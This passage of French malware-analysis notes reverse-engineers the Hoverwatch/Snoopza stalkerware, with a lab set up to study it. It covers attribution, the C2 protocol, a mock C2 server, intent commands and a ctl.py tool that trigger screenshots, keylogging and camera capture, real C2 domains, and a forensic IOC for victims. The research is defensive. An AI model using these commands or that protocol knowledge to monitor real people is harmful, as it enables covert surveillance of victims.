> **Attention aux noms JADX** : `p094hw.installer.ActivityInstaller` est le nom JADX déobfusqué. Le vrai nom manifest est `hw.installer.ActivityInstaller`. Utiliser `dumpsys package com.android.core.mntau | grep Activity` pour retrouver les noms réels.

### 24.8 Alternative : Frida hook

Si le DNS spoofing ne suffit pas (rotation de domaines C2 après registration), le script `howerwatch.js` redirige les getters `z.x()` et `z.y()` et intercepte aussi la crypto DES + le kill switch :

```bash
frida -U -f com.android.core.mntan -l howerwatch.js --no-pause
```

Modifier `MOCK_C2_URL` dans le script avec `https://127.0.0.1:8443/`.

---

## 16. Attribution & architecture multi-brand (v2 — 2026-04-20)

### 16.1 Attribution — Refog Inc.

**Hoverwatch est édité par Refog Inc.**, entreprise avec façade US (Crunchbase, BestPhoneSpy) et background historique russe/ukrainien (keylogger Refog Keylogger pour Windows depuis ~2002). Refog opère également **Snoopza** (snoopza.com) et probablement d'autres brands à confirmer.

Domaines liés à Refog dans AssoEchap/stalkerware-indicators pour Hoverwatch :
`br/de/es/fr/hu/it/nl/ro.refog.com`, `hover.watch`, `hoverwatch.com`, `hws.icu`, `my.hws.icu`, `prospybubble.com`, `refog.com`, `refog.de`, `refog.net`, `refog.org`, `www.hoverwatch.com`, `www.refog.com`

⚠️ **Note de prudence** : AssoEchap regroupe aussi `highstermobi.com` et `prospybubble.com` sous Hoverwatch, mais les sources OSINT attribuent **Highster Mobile à The Powerline Group (NYC, 2010)**, entité distincte. Le groupement AssoEchap est probablement basé sur infrastructure partagée (IP/certs TLS) et non sur une attribution corporate, à consolider avec passive DNS.

### 16.2 Preuve binaire — Hoverwatch ⇌ Snoopza = même codebase

Analyse comparative Hoverwatch v7.5.369 ↔ Snoopza v6.5.83 via JADX MCP :

| Artefact | Hoverwatch | Snoopza | Identique ? |
|---|---|---|---|
| Package | `com.android.core.mntan` | `com.android.core.mngam` | Template parallèle |
| Version | 7.5.369 | 6.5.83 | Numérotation marketing indépendante |
| Classe HTTP | `p092e.p093a.C0737a` (`e.a.a`) | `p092e.p093a.C0737a` (`e.a.a`) | ✅ Identique |
| Fields de `C0737a` | `f5120a`→`f5126g`, mêmes indices, mêmes types | idem | ✅ Bit-à-bit |
| Static init `C0737a` | `f5124e = b0.f6028x ? "SNPA" : b0.f6025u ? "HWA_TST" : "HWA"` | `f5124e = b0.f5991x ? "SNPA" : b0.f5988u ? "HWA_TST" : "HWA"` | ✅ Identique modulo numérotation JADX |
| Méthodes de `C0737a` | `m5323A`→`m5357z` | idem | ✅ Identique |
| Endpoints C2 | `api/online/*` (7 routes) | `api/online/*` (7 routes) | ✅ Identique |
| User-Agent | `Android Monitor {version}` | idem | ✅ Identique |
| Tags de log | `HCl`, `TsDtSnd`, `DMN:`, `St`, `TskInit` | idem | ✅ Identique |
| TrustManager bypass | `C0740d` (`e.a.d`) | `C0740d` (`e.a.d`) | ✅ Identique |
| Payload registration | mêmes clés JSON (`username`, `hid`, `device.perm_*`, etc.) | idem | ✅ Identique |
| Crypto helper | `p094hw.utils.C0870h` → clé `vallengt` | `p094hw.utils.C0874h` → clé `vallengt` | ✅ Identique |
| Collecteurs | 14 modules (302, 304, 305, 312, 313, 314, 319, …) | idem | ✅ Identique |
| `providers.json` (asset orphelin) | 5714 bytes | 5714 bytes | ✅ Même fichier |

**Décalage systématique de ~3 unités** dans la numérotation JADX entre les deux builds (ex: `C0870b0` ↔ `C0867b0`, `C0895z` ↔ `C0892z`, `C0874h` ↔ `C0874h`). C'est un artefact de numérotation JADX qui dépend du nombre total de classes dans le DEX — Snoopza a quelques classes de moins (branding : activités, strings resources), d'où le décalage. Les vrais noms DEX (`e.a.a`, `hw.utils.*`) sont probablement identiques.

**Conclusion** : Hoverwatch et Snoopza sont **un seul produit** compilé en deux build variants Gradle (probablement via `productFlavors { hoverwatch { applicationId ...; buildConfigField "boolean" "IS_SNOOPZA" "false" } ; snoopza { applicationId ...; buildConfigField "boolean" "IS_SNOOPZA" "true" } }`). Le flag `b0.fXXXXx` (constante `static final` inlinée par R8) déterminé au build switch :
- Le `user_type` envoyé au C2 (`HWA` vs `SNPA`)
- Le blob DES des domaines C2 à seeder (cf. §3.6.1)
- L'`applicationId` et donc le package name
- Le branding (icônes, strings resources) — à confirmer via diff resources

### 16.3 Implications

1. **IOCs au niveau code** : la présence du ternaire `"SNPA" : "HWA_TST" : "HWA"` dans `C0737a` est une **signature forte pour rule YARA / signature statique** — tout APK contenant ce pattern appartient à l'écosystème Refog.

2. **Multiplication des marques** : Refog peut produire N brands supplémentaires avec un simple ajout de `productFlavor` + push de nouveau build vers la marketplace. Chaque brand nouvelle demande juste :
   - Un nouvel `applicationId` (`com.android.core.XXXXX`)
   - Un nouveau blob DES de domaines C2 à ajouter dans la condition de `C0624b.mo4063f()`
   - Une nouvelle valeur dans le ternaire de `C0737a` (`XXXX : ...`)

3. **Pattern industriel** : cohérent avec le multi-branding documenté pour l'écosystème Brainstack/Struktura (mSpy, uMobix, Xnspy, Eyezy, Detectico, mLite, Scannero) — **stratégie de dilution du risque légal et de segmentation marketing par brand**.

---

## 17. Assets orphelins (v2)

### 17.1 `providers.json` — 5714 bytes

Fichier ISPDB-style (format K-9 Mail / Thunderbird autoconfig) présent dans les deux APKs (Hoverwatch et Snoopza). Contient la config SMTP auto-discovery de ~20 providers mail (Gmail, Yahoo, Outlook, Yandex, Mail.ru, iCloud, Zoho, GMX, QQ, etc. — `starttls`, `port`, `hostname`, `ssl`).

**Utilisation dans le code : AUCUNE.**

Recherches exhaustives négatives :
| Recherche | Résultat |
|---|---|
| `providers.json` (nom de fichier) | 0 |
| `domain-match` (clé unique du JSON) | 0 |
| `smtp`, `starttls`, `messagingengine` | 0 |
| `javax.mail`, `MimeMessage`, `Transport.send`, `Session.getInstance` | 0 |
| `getAssets` (appel métier) | 0 (uniquement framework Android) |
| `DexClassLoader`, `PathClassLoader`, `loadDex` | 0 |

**Conclusion** : fichier orphelin, vraisemblablement artefact d'une lib tierce embarquée (potentiellement K-9 Mail ou dérivé) pour une feature "send report by email" jamais activée ou tuée. ProGuard/R8 ne strippe pas les assets par défaut → persiste à travers les releases.

**Pour le SoK** : finding notable — "Hoverwatch ships a SMTP autoconfig database (20+ providers) but does not implement any email-based exfiltration channel; all exfiltration is HTTP(S) to the hardcoded C2. Typical technical debt pattern in commercial stalkerware."

---

## 18. Absence de code natif (v2 — DexDispatch)

Run DexDispatch sur l'APK (20/04/2026) :

```
[dexdispatch] Building DEX callgraph (LIEF)...
  Methods: 16504
  Native: 0
  Call edges: 59041
[dexdispatch] Entrypoints: 67
  Native boundaries: 0
  Tainted boundaries: 0
```

**Aucune méthode `native`, aucune frontière JNI.** Tout Hoverwatch est Java pur. Implications :
- Pas besoin de Kharon pour l'analyse
- Pas de libs `.so` custom à reverser
- Pas de parsing natif de `providers.json` ou d'autres assets
- Simplicité de l'architecture = reliance sur l'obfuscation R8 et le chiffrement DES (tous deux contournables)

Confirmation côté `jadx-mcp` : `search_classes_by_keyword("loadLibrary")` = 0, `search_classes_by_keyword("System.load")` = 0, méthodes `native` déclarées = 0.

---

## 25. Bug `MOCK_DOMAINS` — double port après normalisation (v5)

### 25.1 Symptôme

`ServiceCore` démarre en FGS mais **aucun heartbeat ni exfiltration** n'atteint le mock C2 après la registration. La registration elle-même fonctionne, confirmant que le plumbing réseau (`/etc/hosts` + iptables 443→8443 + `adb reverse`) est fonctionnel.

### 25.2 Cause racine

Le normaliseur de domaines `C0895z.m6675w()` force le suffix `:443/` sur tout domaine qui ne le contient pas déjà :

```java
if (!strTrim.contains(":443/")) {
    strTrim = strTrim.substring(0, strTrim.length() - 1);  // strip trailing /
    strTrim = strTrim + ":443/";                            // append :443/
}
```

L'ancien `MOCK_DOMAINS` renvoyait `https://127.0.0.1:8443/`. Ce string contient `:8443/` mais **pas** `:443/` (substring match). Le normaliseur :

1. Strip le `/` final → `https://127.0.0.1:8443`
2. Concatène `:443/` → **`https://127.0.0.1:8443:443/`** — URL invalide (double port)

Tous les requests post-registration (heartbeat `/check/`, exfil `/logs/`) partaient vers cette URL → connexion échouée silencieusement.

### 25.3 Pourquoi la registration fonctionnait

La registration utilise le domaine **seed** (blob DES hardcodé dans le DEX, cf. §3.6.1), pas celui renvoyé par la réponse. Séquence :

1. `CoreApplication.onCreate()` → `C0737a.m5328F()` → TskInit seed les domaines dans SharedPrefs
2. Première requête HTTP : `f5120a` est vide → `C0895z.m6677x()` lit `domains` depuis SharedPrefs → `https://a.syncvch.com:443/`
3. `/etc/hosts` résout → `127.0.0.1` → iptables → adb reverse → mock C2 → **registration OK**
4. La réponse écrase `domains` dans SharedPrefs via `C0895z.m6657n()` avec les valeurs du mock
5. Si le mock renvoie `127.0.0.1:8443` → normalisation casse l'URL → tous les requests suivants échouent

### 25.4 Fix

`server.py` : remplacement de `MOCK_DOMAINS` hardcodé `127.0.0.1:8443` par les vrais domaines C2 déchiffrés :

```python
MOCK_DOMAINS = (
    "https://a.syncvch.com:443/;"
    "https://i1.hoverwatch.com:443/;"
    "https://hwa.cab:443/"
)
```

Ces domaines contiennent déjà `:443/` → le normaliseur ne touche à rien → la même chaîne `/etc/hosts` + iptables fonctionne pour tous les requests.

### 25.5 Findings annexes durant le diagnostic

**Condition de démarrage `m6653j0()`** (flag "app active") :

```java
private static boolean m6653j0() {
    return m6659o() == APP_STATE_INSTALLED   // AppInstState == 1
        && m6681z()                           // EnableMonitor (default true)
        && m6631T() >= 0;                     // ValidThrough - now + 7j >= 0
}
```

- **`EnableMonitor`** : default `true` dans le getter `m6681z()`. Le setter `m6678x0(true)` ne persiste jamais la clé car `m6681z() != true` est `false` → guard condition skip l'écriture. La clé est donc **absente** des SharedPrefs mais fonctionnellement `true`. Pas un bug.
- **`ValidThrough`** : set par la réponse de registration (`valid_through` JSON → `m6642Y0()` → `SimpleDateFormat("yyyy-MM-dd HH:mm:ss")`). Si absent (default 0), le check `m6631T() >= 0` échoue systématiquement → app inactive. Le mock C2 doit impérativement renvoyer un `valid_through` dans le futur.
- **Variante SNPA** : `m6652i0()` utilise une condition relaxée (pas de check `ValidThrough`) si `C0870b0.f6028x == true` (build Snoopza).

**Restriction FGS Android 13+** :

```
Foreground service started from background can not have location/camera/microphone access
```

Un FGS démarré depuis le background perd les permissions `WHILE_IN_USE` (GPS, micro, caméra). Contournement : lancer une activité Hoverwatch (`am start -n com.android.core.mntau/com.activities.ActivityMainStarter`) pour donner le contexte foreground avant le démarrage du service.

### 25.6 Résultat

Après fix, le mock C2 reçoit avec succès :
- 86 exception parts (logs internes, confirmation seed domaines, init DB)
- 44 log events (type 308 = événements système)
- 1 selfie JPEG (type 317, 15 KB, sauvé dans `logs/raw/`)

Exfiltration live fonctionnelle — le mock C2 capture désormais toutes les données volées par Hoverwatch.

---

## 26. Push de commandes depuis le C2 (v5)

### 26.1 Pas de FCM

Contrairement à la v7.5.369 (qui référençait 60+ commandes FCM), la v7.5.385 **n'embarque aucun code Firebase Messaging** (`FirebaseMessaging`, `onMessageReceived`, `GcmReceiver` = 0 hit). Le contrôle est entièrement **pull-based**.

### 26.2 Mécanisme de settings push via heartbeat

L'app envoie le header `x-settings-ver: {version}` dans chaque heartbeat `POST /api/online/check/`. Le flow de mise à jour :

1. **`m5325C()`** (flow SEND_DATA, déclenché périodiquement ou via intent) appelle `m5351t()` avec le header `x-settings-ver`
2. **`m5351t()`** (502 instructions, décompilation échouée) appelle `POST /api/online/check/` avec les headers custom
3. Si la réponse contient un JSON avec `settings`, **`m6580n()`** est appelé
4. **`m6580n()`** compare `settings.version` avec la version locale (`C0895z.m6623P()`)
5. Si `server_ver > client_ver` : les settings sont appliqués module par module

⚠️ **Attention** : il existe deux appels `/check/` distincts :
- `m5350s()` — ping simple, ne parse **pas** le body JSON (log : `"HCl pcl: ok"`)
- `m5351t()` — sync complet, parse le body JSON pour les settings (appelé via `m5325C`/SEND_DATA)

Seul `m5351t()` traite les settings push. Le cycle SEND_DATA est déclenché toutes les `period` minutes (configurable via settings, default 10 min).

### 26.3 Settings JSON — modules contrôlables

Extrait de `m6580n()` (handler de settings dans `C0894y`) :

| Clé JSON | Module | IDs internes |
|---|---|---|
| `on` | Master switch (`EnableMonitor`) | — |
| `debug` | Mode debug | — |
| `period` | Intervalle de sync (minutes) | — |
| `onlyWiFi` | Exfiltration WiFi uniquement | — |
| `showtab` | Afficher icône launcher | — |
| `call.on` / `call.rec` / `call.quality` / `call.source` / `call.codec` / `call.gain` | Enregistrement d'appels | 312 |
| `shot.on` / `shot.period` | Capture d'écran (MediaProjection) | 302 |
| `location.on` / `location.period` / `location.acc` / `location.gps` | Géolocalisation | 314 |
| `chat.on` | Interception IM (AccessibilityService) | 304 |
| `sms.on` | Interception SMS | 313 |
| `url.on` | Historique navigateur | 305 |
| `frcam.on` / `frcam.photo` | Caméra frontale (selfie) | 317/319 |
| `keys.on` | Keylogger | 301 |
| `files.on` | Monitoring fichiers | — |
| `app.on` | Usage apps | 307 |
| `contact.on` | Contacts | 315 |
| `calendar.on` | Calendrier | 316 |
| `sim.on` | Monitoring SIM | — |

La condition d'application : `settings.version > version_stockée_localement`. Le mock C2 incrémente automatiquement la version via `/admin/settings`.

### 26.4 Commandes locales via Intent (ServiceCore)

En parallèle des settings push, les commandes peuvent être injectées localement via `am start-foreground-service` :

```
am start-foreground-service -n com.android.core.mntau/hw.utils.ServiceCore --es INTENT_FUNC_KEY <CMD>
```

| Commande | Handler | Rôle |
|---|---|---|
| `INITIALIZE` | `C0624b` | Init complète (seed domaines, sync, lancement collecte) |
| `SEND_DATA` | `C0737a.e` via `m5325C` | Force sync + exfiltration (déclenche `m5351t` → pull settings + upload) |
| `SYNC_EVENTS` | `C0626d` | Sync des événements collectés |
| `SYNC_HEAVY_EVENTS` | `C0627e` | Sync contacts, fichiers, apps, historique |
| `MAKE_PHOTO` | `C0618g.a` | Photo selfie (caméra frontale, type 317) |
| `MAKE_SCREENSHOT` | `C0619h.a` | Capture d'écran (MediaProjection, type 302) |
| `WRITE_LOCATION` | `C0625c` | Force écriture GPS |
| `CHECK_SIM` | `C0623a` | Vérification SIM |
| `ENCODE` | `C0862i` | Encodage enregistrement audio |

### 26.5 Outil de contrôle (`ctl.py`)

Script Python (`mock_c2/ctl.py`) pour piloter le mock C2 sans souffrir de PowerShell :

```bash
uv run ctl.py screenshot --period 1   # activer screenshots
uv run ctl.py photo                   # selfie caméra frontale
uv run ctl.py location --period 1     # GPS précision max
uv run ctl.py keylog                  # keylogger
uv run ctl.py callrec                 # enregistrement appels
uv run ctl.py chat / sms              # interception IM / SMS
uv run ctl.py sync --period 1         # réduire intervalle sync
uv run ctl.py off / on                # master switch
uv run ctl.py kill [auth_key]         # kill switch (HTTP 410)
uv run ctl.py status / devices / exfil # info
```

### 26.6 Flow de bout en bout validé (screenshot)

```
[PC] ctl.py screenshot --period 1
  → POST /admin/settings {"shot": {"on": true, "period": 1}}
  → DEFAULT_SETTINGS.version incrémenté (100 → 101)

[Device] Cycle SEND_DATA (~10 min ou forcé via am ... SEND_DATA)
  → m5325C() → m5351t(["x-settings-ver", "100"])
  → POST /api/online/check/ (x-settings-ver: 100)

[Mock C2] server_ver=101 > client_ver=100
  → répond JSON avec settings {"shot": {"on": true, "period": 1}, "version": 101}

[Device] m6580n() parse la réponse
  → applique shot.on=true, persiste version=101
  → MediaProjection capture l'écran (JPEG, type 302)
  → POST /api/online/logs/ (multipart, attachment JPEG 93 KB)

[Mock C2] reçoit le screenshot dans logs/raw/
  → heartbeats suivants : settings-ver=101 (confirmé appliqué)
```

Confirmé fonctionnel le 21/04/2026 sur Corellium (Android 16, Hoverwatch 7.5.385).

---

## 27. Cross-install device fingerprinting — persistance d'identification post-désinstall (v6 — 2026-05-05)

### 27.1 Découverte

Lors de tests dynamiques sur Pixel 7 avec le vrai C2 Hoverwatch : après désinstallation d'un premier sample et installation d'un second, le serveur C2 refuse l'enrollment avec un message "device already recorded". Un factory reset du device permet le ré-enrollment. Comportement incompatible avec un fingerprinting basé sur l'IMEI (inchangeable sur Pixel 7, donc le factory reset n'aurait rien résolu).

### 27.2 Mécanisme identifié — `C0884o.m6430y()`

La méthode `m6430y()` (classe utilitaire `p094hw.utils.C0884o`) implémente un **double mécanisme de persistance d'identifiant** :

```java
public static String m6430y() {
    // 1. Cherche un fichier sur le stockage partagé ("sdcard")
    File file = new File(Environment.getExternalStorageDirectory()
        + File.separator + "dev_" + Build.MODEL);  // ex: /sdcard/dev_Pixel 7
    if (file.exists()) {
        string = C0887r.m6493n(file);               // lit l'ID depuis le fichier
        log("mpk", " SaID " + string);              // "Saved ID"
    } else {
        // 2. Première install : génère l'ID
        string = Settings.Secure.getString(resolver, "android_id");
        if (isEmpty(string)) string = timestamp();   // fallback
        log("mpk", " SV ID" + string);              // "Save ID"
        C0887r.m6475O(file, string);                 // persiste sur sdcard
    }
    return string;
}
```

Cette valeur est envoyée au C2 dans le champ `"hid": "and:<valeur>"` du payload de registration (cf. §3.3).

### 27.3 Cycle de vie de l'identifiant

| Événement | Fichier `/sdcard/dev_<model>` | `ANDROID_ID` | `hid` envoyé au C2 | Résultat enrollment |
|---|---|---|---|---|
| **Premier install** | ❌ n'existe pas | Valeur A | Lit ANDROID_ID → écrit fichier → `"and:A"` | ✅ Nouveau device |
| **Désinstall** | ✅ survit (sdcard non wipé) | Valeur A (inchangé) | — | — |
| **Réinstall (même device)** | ✅ existe → lit valeur A | Ignoré (fichier prioritaire) | `"and:A"` | ❌ "already recorded" |
| **Factory reset** | ❌ wipé (sdcard effacé) | Valeur B (regénéré) | Lit ANDROID_ID → écrit fichier → `"and:B"` | ✅ Nouveau device |
| **Suppression manuelle du fichier** | ❌ supprimé par `rm` | Valeur A (inchangé) | Lit ANDROID_ID → écrit fichier → `"and:A"` | ⚠️ Dépend si le serveur a purgé l'ancien record |

### 27.4 Pourquoi ça fonctionne sur Pixel 7 (sans carte SD physique)

`Environment.getExternalStorageDirectory()` ne désigne **pas** une carte SD physique. C'est le **stockage partagé émulé** (`/storage/emulated/0/` = `/sdcard/`), présent sur tous les devices Android, y compris ceux sans slot SD comme le Pixel 7.

La distinction pertinente :
- `/data/data/<pkg>/` → stockage **privé** de l'app → **wipé à la désinstall**
- `/sdcard/` (= `/storage/emulated/0/`) → stockage **partagé** → **pas wipé à la désinstall**, mais wipé au factory reset

Le flag `android:requestLegacyExternalStorage="true"` dans le manifest (cf. §1) permet à Hoverwatch d'accéder au sdcard root en mode legacy (contournement de Scoped Storage Android 10+), précisément pour cette opération de persistance.

### 27.5 IOC forensique

Sur un device suspecté compromis par Hoverwatch (ou Snoopza, même codebase) :

```bash
# Détection — même après désinstallation de l'app
adb shell ls -la /sdcard/dev_*

# Exemple de résultat positif :
-rw-rw---- 1 u0_a123 sdcard_rw 16 2026-04-15 14:32 /sdcard/dev_Pixel 7

# Contenu = ANDROID_ID utilisé lors de l'enrollment
adb shell cat "/sdcard/dev_Pixel 7"
# → ex: a1b2c3d4e5f6g7h8
```

**Valeur forensique** :
- La **présence** du fichier `dev_*` prouve qu'un stalkerware Refog (Hoverwatch/Snoopza) a été installé sur le device, **même si l'app a été désinstallée**
- Le **contenu** (ANDROID_ID) permet de corréler avec les logs C2 si saisis
- Le **timestamp de création** (`stat`) donne la date approximative de première infection
- Le **nom du fichier** contient le `Build.MODEL` → confirmation du device cible

### 27.6 Bypass pour pipeline d'analyse

Pour les tests dynamiques sur banc de test, au lieu d'un factory reset entre chaque sample :

```bash
# Supprimer le fichier de persistance
adb shell rm "/sdcard/dev_$(adb shell getprop ro.product.model)"

# Vérifier
adb shell ls /sdcard/dev_*
# ls: /sdcard/dev_*: No such file or directory

# Réinstaller le sample → enrollment OK
```

À scripter dans le pipeline ASTRA/stalkerware pour reset automatique entre les runs.

### 27.7 Analyse comparative avec d'autres familles

| Famille | Clé de fingerprinting C2 | Survit désinstall | Survit factory reset |
|---|---|---|---|
| **Hoverwatch/Snoopza** | ANDROID_ID persisté sur sdcard (`/sdcard/dev_<model>`) | ✅ Oui | ❌ Non |
| Mobile Tracker Free | À déterminer (probablement ANDROID_ID ou UUID SharedPrefs) | À tester | À tester |
| mSpy/Brainstack | À déterminer | À tester | À tester |

→ Pattern à systématiser dans le pipeline d'analyse : pour chaque famille, documenter le mécanisme de fingerprinting C2 et sa persistance cross-install.

### 27.8 Implications pour les victimes

1. **La désinstallation ne suffit pas** : le fichier `/sdcard/dev_*` reste et permet au C2 Refog de tracker le device même après nettoyage apparent
2. **Un factory reset est le seul nettoyage complet** sur ce vecteur (mais attention aux autres vecteurs de persistance : comptes Google, backups cloud, etc.)
3. **Pour les accompagnant·e·s (CSIRT, associations)** : ajouter `ls /sdcard/dev_*` au checklist de triage forensique rapide — c'est un IOC post-désinstall rare et très spécifique à l'écosystème Refog

---

## 19. TODO

### Terminé

- [x] Analyser le protocole C2 complet (endpoints, auth, codes HTTP)
- [x] Documenter le chiffrement DES et la clé hardcodée (**corrigé v2 : `vallengt`**)
- [x] Identifier les 100+ apps ciblées (IM, navigateurs, dating)
- [x] Analyser le service d'enregistrement audio
- [x] Analyser la capture d'écran (MediaProjection)
- [x] Analyser l'interception IM (AccessibilityService + parsers WhatsApp, etc.)
- [x] Documenter la géolocalisation (GPS + WiFi + Cell + schéma SQL)
- [x] Extraire la configuration distante (settings JSON, modules)
- [x] Identifier les modules keylogger (keys) et caméra frontale (frcam/319)
- [x] Générer la spec JSON complète du protocole C2 (`hoverwatch_c2_protocol.json`)
- [x] **Extraire les domaines C2 par défaut** — seedés in-binary via blobs DES (cf. §3.6) — v2
- [x] **Vérifier s'il y a du code natif** — confirmé 0 méthode native via DexDispatch — v2
- [x] **Attribution / éditeur** — Refog Inc., confirmé via binary diff avec Snoopza — v2
- [x] **Statut de `providers.json`** — asset orphelin confirmé — v2
- [x] **Déchiffrer les strings obfusquées** (`C0874h.m6237c()`) — 13 blobs décryptés, finding canary `"refog"` + YouTube Kids caché — v3 (cf. §5.5)
- [x] **Analyser le kill switch** (`C0744c`) — Intent.ACTION_DELETE standard, opportuniste via USER_PRESENT — v3 (cf. §20)
- [x] **Format des logs exfiltrés** — multipart Apache HttpClient, **PAS protobuf** comme cru en v1/v2 — v3 (cf. §6.5)
- [x] **Schéma BDD messages IM** (`C0752h`/`C0751h`) — table `mpk_events`, structure `i`, dédup temporelle, rétention 300/conv — v3 (cf. §9.5)
- [x] **Flow `ActivityInstaller`** — 11 fragments séquentiels, 18 modules togglables — v3 (cf. §22)
- [x] **Anti-forensics logcat** — crash scraping + clearing via DES strings dans `C0878l$a` — v3 (cf. §21)
- [x] **Système de camouflage** — 8 activity-aliases imitant des apps système (Settings, Calendar, Camera, Clock, Contacts, Gallery, Messaging, Phone), identité sélectionnable par l'attaquant — v4 (cf. §23)
- [x] **Anti-VM / anti-émulation** — confirmé zéro détection (0 hit sur qemu/goldfish/corellium/SafetyNet/etc.) — v4 (cf. §23.6)
- [x] **Setup lab Corellium** — adb reverse + iptables + /etc/hosts, tunnel vers mock C2 fonctionnel — v4 (cf. §24)
- [x] **Mapping noms JADX → manifest** — `p094hw.*` = `hw.*` dans le manifest, `com.activities.*` inchangés — v4 (cf. §2.3)
- [x] **Flow de lancement** — `ActivityMainStarter` → `ActivityMain` → wizard vs cover behaviors (Settings/Dbl) — v4 (cf. §23.2)

- [x] **Diagnostic démarrage ServiceCore** — identification de la chaîne de conditions `m6653j0()` = `AppInstState==INSTALLED && EnableMonitor && ValidThrough+7j>=0`. `EnableMonitor` a un default `true` (jamais persisté car le setter skip quand la valeur ne change pas). Le vrai blocker était `MOCK_DOMAINS` → voir §25 — v5
- [x] **Exfiltration live confirmée** — 86 exception parts + 44 log events + selfie JPEG (type 317) reçus par le mock C2 — v5
- [x] **Mécanisme de push settings** — pull-based via heartbeat `/check/` (pas de FCM dans la 385), handler `m6580n()`, 18 modules contrôlables, screenshot (type 302) confirmé de bout en bout, `ctl.py` créé — v5 (cf. §26)

### À faire

- [x] **Mettre à jour le mock C2 server** (`mock_c2/`) avec les findings v3 :
  - format multipart au lieu de protobuf
  - parts nommées `log%04d` / `exception%04d`
  - support des deux brands (header `X-Auth-Key`, path `programversion/{HWA|SNPA}/`)
  - **fix v5** : `MOCK_DOMAINS` remplacé par vrais domaines C2 (`a.syncvch.com`, `i1.hoverwatch.com`, `hwa.cab`) — l'ancien `127.0.0.1:8443` causait un double port après normalisation `m6675w()` → zéro heartbeat post-registration
  - tests Suricata/Snort signatures
- [x] **Cross-install device fingerprinting** — mécanisme identifié : ANDROID_ID persisté dans `/sdcard/dev_<Build.MODEL>` via `C0884o.m6430y()`, envoyé au C2 dans le champ `hid`. Survit à la désinstall (sdcard non wipé), dégage au factory reset (sdcard + ANDROID_ID regénérés). IOC forensique : `ls /sdcard/dev_*`. Bypass pour tests : `rm /sdcard/dev_*` — v6 (cf. §27)
- [ ] **Passive DNS / certs TLS** sur les 6 domaines C2 (`a.syncvch.com`, `i1.hoverwatch.com`, `hwa.cab`, `snsync.com`, `app.snoopza.com`, `api.snoopza.com`) — corrélation infra Snoopza↔Hoverwatch via Validin/SecurityTrails/DomainTools
- [ ] **PR upstream AssoEchap/stalkerware-indicators** avec les 4 nouveaux IOCs (`a.syncvch.com`, `hwa.cab`, `snsync.com`, `app.snoopza.com`) + clarifier sous-domaines partiels (`i1.hoverwatch.com`, `api.snoopza.com`)
- [ ] **Rule YARA** basée sur le canary `"refog"` déchiffrable + ternaire `"SNPA":"HWA_TST":"HWA"` dans `C0737a` — signature Refog ecosystem
- [ ] **Diff resources** Hoverwatch/Snoopza (`res/values/strings.xml`, drawables `ic_launcher`, `ic_dbl_launcher`, `ic_sett_launcher`) pour confirmer le scope exact du branding et lister les strings de marque dans chaque APK
- [ ] **Reverser d'autres samples** Refog candidats : Highstermobi, Prospybubble, Refog Personal Monitor — confirmer/infirmer appartenance via :
  - Présence du canary `"refog"` déchiffrable
  - Pattern package `com.android.core.XXXXX`
  - Présence de `f5124e` ternaire avec leur brand code
- [ ] **Update Notion** — page "Écosystème stalkerware" avec finding Refog Inc. distinct de Brainstack/Struktura, ajouter les 6 domaines C2 et le pattern multi-brand
